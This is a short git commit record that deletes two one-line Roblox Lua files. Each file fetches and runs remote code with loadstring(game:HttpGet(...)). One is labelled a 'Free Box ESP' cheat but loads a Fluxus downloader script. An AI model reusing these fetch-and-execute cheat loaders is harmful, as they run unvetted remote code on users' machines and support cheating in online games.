c8d7f0a1d3944423a4a83240f6f9413ac7a093f9
Purity <66000596+graalpurity@users.noreply.github.com>
2021-02-20 16:48:19 -0500

    Delete Lua directory

--- Lua/Phantom Forces Free Box ESP.lua
+++
@@ -1,1 +0,0 @@
-loadstring(game:HttpGet("https://fluxteam.xyz/scripts/downloadfluxus.lua", true))()
--- Lua/gui.lua
+++
@@ -1,1 +0,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Mikehales7/EHUB/master/Roblox"))()
